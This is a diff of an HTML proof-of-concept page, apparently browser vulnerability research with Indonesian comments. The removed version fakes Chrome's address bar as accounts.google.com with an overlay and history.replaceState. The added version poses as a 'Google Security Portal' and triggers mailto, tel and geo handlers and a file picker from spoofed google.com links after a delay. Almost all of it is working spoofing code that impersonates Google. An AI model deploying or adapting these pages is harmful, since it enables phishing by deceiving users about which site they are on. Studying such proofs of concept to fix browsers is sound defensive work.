@@ -1,122 +1,188 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Android Chrome Address Bar Overlay PoC</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+    <title>File Picker & Protocol Spoof PoC</title>
     <style>
-      body, html {
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        height: 100dvh;
-        width: 100vw;
-        background: #202124;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: #e8eaed;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        overflow: hidden;
-      }
-      .container {
-        text-align: center;
-        max-width: 480px;
-        padding: 24px;
-        box-sizing: border-box;
-        z-index: 10;
-      }
-      button {
-        width: 100%;
-        padding: 18px 24px;
-        font-size: 16px;
-        font-weight: 600;
-        background: #8ab4f8;
-        color: #202124;
-        border: none;
-        border-radius: 12px;
-        cursor: pointer;
-        box-shadow: 0 4px 14px rgba(138, 180, 248, 0.3);
-        transition: transform 0.1s, background 0.2s;
-      }
-      button:active { background: #7c9fdf; transform: scale(0.98); }
-      .info {
-        margin-top: 20px;
-        font-size: 13px;
-        color: #9aa0a6;
-        font-family: monospace;
-        word-break: break-all;
-      }
-      
-      /* Overlay tiruan bilah alamat di bagian atas */
-      #spoofOverlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 56px;
-        background: #35363a;
-        z-index: 2147483647;
-        display: none;
-        align-items: center;
-        padding-left: 16px;
-        box-sizing: border-box;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-      }
-      .fake-url {
-        font-size: 14px;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      }
-      .host { color: #e8eaed; font-weight: 500; }
-      .path { color: #9aa0a6; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .banner {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        h1 {
+            font-size: 20px;
+            color: #1a73e8;
+            margin-bottom: 24px;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            width: 100%;
+            max-width: 340px;
+        }
+        a.spoof-link {
+            display: inline-block;
+            background-color: #1a73e8;
+            color: white;
+            padding: 14px 28px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
+            cursor: pointer;
+        }
+        a.spoof-link:active {
+            background-color: #1557b0;
+        }
+        .preview-container {
+            margin-top: 25px;
+            max-width: 280px;
+            display: none;
+        }
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        }
+        .file-info {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #5f6368;
+            word-break: break-all;
+        }
+        .footer-note {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #9aa0a6;
+        }
     </style>
-  </head>
-  <body>
-    <!-- Overlay Tiruan URL -->
-    <div id="spoofOverlay">
-      <div class="fake-url">
-        <span class="host">accounts.google.com</span><span class="path">/download/chrome</span>
-      </div>
+</head>
+<body>
+
+    <div class="banner">Google Security Portal</div>
+    <h1>Secure Document Verification</h1>
+
+    <!-- Container dengan 4 Tombol Terpisah dengan Intent Berbeda -->
+    <div class="button-container">
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkGeo" data-intent="location_verification">Open Window & Verify Geo-Location</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
     </div>
 
-    <div class="container">
-      <button id="execBtn">TRIGGER OVERLAY SPOOF</button>
-      <div class="info" id="statusInfo">Status: Ready to display spoof surface.</div>
+    <!-- Uploaded Image / Status Preview Box -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="File Preview">
+        <div class="file-info" id="fileInfo"></div>
     </div>
+
+    <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-      let execButton = document.getElementById("execBtn");
-      let statusInfo = document.getElementById("statusInfo");
-      let spoofOverlay = document.getElementById("spoofOverlay");
-      let hasExecuted = false;
+        let triggered = false;
 
-      function triggerOverlaySpoof() {
-        if (hasExecuted) return;
-        hasExecuted = true;
+        const executeAttackVector = (actionType, intent) => {
+            if (triggered) return;
+            triggered = true;
 
-        statusInfo.innerText = "Status: Updating history state & rendering overlay layer...";
-        execButton.style.display = "none";
+            setTimeout(async () => {
+                try {
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
+                    const fileInfo = document.getElementById("fileInfo");
 
-        try {
-          // 1. Sinkronisasi history state jalur lokal
-          history.replaceState({ target: "accounts.google.com" }, "", "/download/chrome");
+                    if (actionType === 'mailto') {
+                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'tel') {
+                        window.location.href = "tel:+18005550199";
+                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
+                    else if (actionType === 'geo') {
+                        window.location.href = "geo:0,0?q=Googleplex,+Mountain+View,+CA";
+                        fileInfo.innerText = `Triggered geo protocol for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
+                    else if (actionType === 'filepicker') {
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false,
+                            types: [{
+                                description: 'Images & Documents',
+                                accept: { 
+                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                    'application/pdf': ['.pdf']
+                                }
+                            }]
+                        });
 
-          // 2. Menampilkan elemen penindih visual di atas halaman
-          if (spoofOverlay) {
-            spoofOverlay.style.display = "flex";
-          }
+                        const file = await fileHandle.getFile();
+                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
 
-          statusInfo.innerText = "Status: Overlay surface active.";
-        } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
-          execButton.style.display = "block";
-          hasExecuted = false;
-        }
-      }
+                        if (file.type.startsWith('image/')) {
+                            imagePreview.src = URL.createObjectURL(file);
+                            previewBox.style.display = "block";
+                        } else {
+                            imagePreview.src = "";
+                            previewBox.style.display = "block";
+                        }
+                    }
 
-      execButton.onclick = () => {
-        triggerOverlaySpoof();
-      };
+                } catch (err) {
+                    console.debug("Handler cancelled or blocked:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 1000);
+                }
+            }, 2000);
+        };
+
+        // Event listener untuk Tombol Mailto
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('mailto', linkMailto.getAttribute('data-intent')); });
+        linkMailto.addEventListener("contextmenu", (e) => { e.preventDefault(); executeAttackVector('mailto', linkMailto.getAttribute('data-intent')); });
+
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('tel', linkTel.getAttribute('data-intent')); });
+        linkTel.addEventListener("contextmenu", (e) => { e.preventDefault(); executeAttackVector('tel', linkTel.getAttribute('data-intent')); });
+
+        // Event listener untuk Tombol Geo (Tambahan Baru)
+        const linkGeo = document.getElementById("targetLinkGeo");
+        linkGeo.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('geo', linkGeo.getAttribute('data-intent')); });
+        linkGeo.addEventListener("contextmenu", (e) => { e.preventDefault(); executeAttackVector('geo', linkGeo.getAttribute('data-intent')); });
+
+        // Event listener untuk Tombol File Picker
+        const linkFile = document.getElementById("targetLinkFile");
+        linkFile.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('filepicker', linkFile.getAttribute('data-intent')); });
+        linkFile.addEventListener("contextmenu", (e) => { e.preventDefault(); executeAttackVector('filepicker', linkFile.getAttribute('data-intent')); });
     </script>
-  </body>
+
+</body>
 </html>
